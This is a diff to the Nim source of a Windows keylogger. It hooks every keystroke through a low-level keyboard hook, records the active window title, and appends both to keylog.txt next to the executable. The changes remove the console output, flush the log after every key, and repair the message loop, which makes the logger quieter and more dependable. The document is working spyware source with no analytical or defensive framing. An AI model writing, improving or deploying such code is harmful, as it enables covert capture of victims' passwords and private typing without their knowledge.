@@ -11,6 +11,10 @@ import tables
 import strformat
 import strutils
 
+import os
+let logPath = getAppDir() / "keylog.txt"
+let f = open(logPath, fmAppend)
+
 type
     Keys = enum
         Modifiers = -65536
@@ -295,18 +299,20 @@ var
         Keys.OemOpenBrackets: "",
     }.toTable()
 
-proc GetActiveWindowTitle(): LPWSTR = 
+proc GetActiveWindowTitle(): string = 
     var capacity: int32 = 256
-    var builder: LPWSTR = newString(capacity)
+    var builder = newWideCString("", capacity)
     var wHandle = GetForegroundWindow()
-    defer: CloseHandle(wHandle)
-    GetWindowText(wHandle, builder, capacity)
-    return builder
+    GetWindowTextW(wHandle, builder, capacity)
+    # The $ operator converts WideCString to a standard Nim string
+    return $builder
 
 proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =    
     if nCode >= 0 and wParam == WM_KEYDOWN:
         var keypressed: string
         var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
+        
+        # Capture title as a string immediately
         var currentActiveWindow = GetActiveWindowTitle()
         var shifted: bool = (GetKeyState(160) < 0) or (GetKeyState(161) < 0)
         var keycode: Keys = cast[Keys](kbdstruct.vkCode)
@@ -322,18 +328,19 @@ proc HookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdca
             else:
                 keypressed = $toUpperAscii(chr(ord(keycode)))
 
-        echo fmt"[*] Key: {keypressed} [Window: '{currentActiveWindow}']"
-        writeFile("keylog.txt", fmt"Key: {keypressed} [Window: '{currentActiveWindow}']\n", fmAppend)
+        # Write and FLUSH
+        f.writeLine(fmt"Key: {keypressed} -> Window: '{currentActiveWindow}'")
+        f.flushFile() # <--- THIS IS THE CRITICAL ADDITION
+        
     return CallNextHookEx(0, nCode, wParam, lParam)
 
-var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0,  0)
+var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0, 0)
 if bool(hook):
     try:
-        echo "[*] Hook successful"
-        PostMessage(0, 0, 0, 0)
-
         var msg: MSG
         while GetMessage(msg.addr, 0, 0, 0):
-            discard
+            TranslateMessage(msg.addr)
+            DispatchMessage(msg.addr)
     finally:
         UnhookWindowsHookEx(hook)
+        f.close()
